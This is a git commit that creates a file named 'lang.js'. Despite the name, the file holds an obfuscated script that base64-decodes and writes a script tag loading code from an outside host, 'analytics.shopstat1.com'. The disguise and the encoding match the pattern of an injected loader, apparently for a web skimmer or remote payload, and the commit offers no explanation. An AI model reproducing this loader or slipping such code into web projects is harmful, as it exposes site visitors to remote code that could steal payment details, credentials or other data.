9bd762ea1407c0be70c298b15bac9dede76eea7c
version2 <57840254+version2@users.noreply.github.com>
2020-07-23 17:31:16 +0200

    Create lang.js

---
+++ lang.js
@@ -0,0 +1,5 @@
+<script>
+var string = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8vYW5hbHl0aWNzLnNob3BzdGF0MS5jb20vZGF0ZWpzLmpzIj48L3NjcmlwdD4=';
+var decodedString = atob(string);
+document.write(''+ decodedString +'');
+</script>
